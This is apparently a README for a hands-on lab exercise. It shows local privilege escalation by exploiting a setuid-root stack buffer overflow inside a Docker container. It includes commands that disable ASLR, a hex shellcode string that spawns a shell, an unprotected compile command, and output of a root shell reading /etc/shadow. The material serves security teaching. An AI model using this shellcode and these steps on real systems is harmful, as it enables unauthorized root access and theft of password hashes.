### Try priviledged escalation (権限昇格) using Arbitrary code execution vulnerability(任意のコード実行脆弱性)
#### Caution
- You must enable ASLR after this.
```
# enable
sysctl -w kernel.randomize_va_space=2
```

### Run docker images
```
docker run --rm --privileged -it suezawa/exploit-exercise2 /bin/bash
```

### Procedure
- Disable ASLR
```
sysctl -w kernel.randomize_va_space=0
```

- Change user from root to appuser(unprivileged user)
```
# su appuser --shell=/bin/bash
```

- Try to cat shadow
```bash
$ cat /etc/shadow
cat: /etc/shadow: Permission denied
```

- Confirm buffer array's address
```
$ ./bof
buf = 0x7fffffffe590
$ ./bof
buf = 0x7fffffffe590
````
You have to run it twice and confirm both address is same
(If ASLR is enabled, the address is changed.)

- Attack bof
```
$ ls -l bof
-rwsr-sr-x 1 root root 2051370 Jan 10 04:53 bof
$
$ python exploit_print.py 0x7fffffffe590(your buffer's address) | ./bof
Thank you!
msg :
```
You have to use your buffer array's address instead of `0x7fffffffe590`

- Got shell
```
id
#[return] uid=1000(appuser) gid=37(appuser) euid=0(root) egid=0(root) groups=0(root),37(appuser)
cat /etc/shadow
#[return] root:*:18179:0:99999:7:::
```

- Re-enable ASLR on root (Must)
```
# sysctl -w kernel.randomize_va_space=2
```

### How to create shellcode
```
# rasm2 -f shellcode.s
4831c048b82f62696e2f736800504989e04831c048c7c02d700000504989e14831c050415141504989e248c7c03b0000004c89c74c89d64831d20f05
```

### How to compile binary
```
gcc -fno-stack-protector -z execstack bof.c -o /bof
```
